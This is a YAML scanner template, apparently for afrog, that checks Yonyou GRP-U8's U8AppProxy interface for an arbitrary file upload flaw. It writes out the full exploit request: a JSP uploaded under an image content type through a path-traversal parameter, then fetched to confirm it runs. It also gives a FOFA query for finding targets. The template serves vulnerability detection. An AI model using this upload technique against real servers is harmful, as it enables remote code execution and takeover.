expression: r0() && r1()
id: yongyou-grp-u8-app-proxy-uploadfile
info:
  author: zan8in
  description: "\u7528\u53CB GRP-U8 U8AppProxy\u63A5\u53E3\u5B58\u5728\u4EFB\u610F\
    \u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\uFF0C\u653B\u51FB\u8005\u901A\u8FC7\u6F0F\
    \u6D1E\u53EF\u4EE5\u83B7\u53D6\u670D\u52A1\u5668\u6743\u9650\u3002\nfofa: title=\"\
    \u7528\u53CBGRP-U8\u884C\u653F\u4E8B\u4E1A\u5185\u63A7\u7BA1\u7406\u8F6F\u4EF6\
    \"\n"
  name: "\u7528\u53CB GRP-U8 U8AppProxy \u4EFB\u610F\u6587\u4EF6\u4E0A\u4F20"
  reference:
  - https://mp.weixin.qq.com/s/vrfBOj62Wq54of4rcY-pIQ
  severity: critical
  verified: true
rules:
  r0:
    expression: response.status == 500
    request:
      body: "--WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data;\
        \ name=\"file\"; filename=\"1.jsp\"\r\nContent-Type: image/png\r\n\r\n<% out.println(\"\
        {{randbody}}\");%>\r\n--WebKitFormBoundary{{rboundary}}-\r\n"
      headers:
        Content-Type: multipart/form-data; boundary=WebKitFormBoundary{{rboundary}}
      method: POST
      path: /U8AppProxy?gnid=myinfo&id=saveheader&zydm=../../{{randstr}}
  r1:
    expression: response.status == 200 && response.body.bcontains(bytes(randbody))
    request:
      method: GET
      path: /{{randstr}}.jsp
set:
  randbody: randomLowercase(28)
  randstr: randomLowercase(5)
  rboundary: randomLowercase(8)
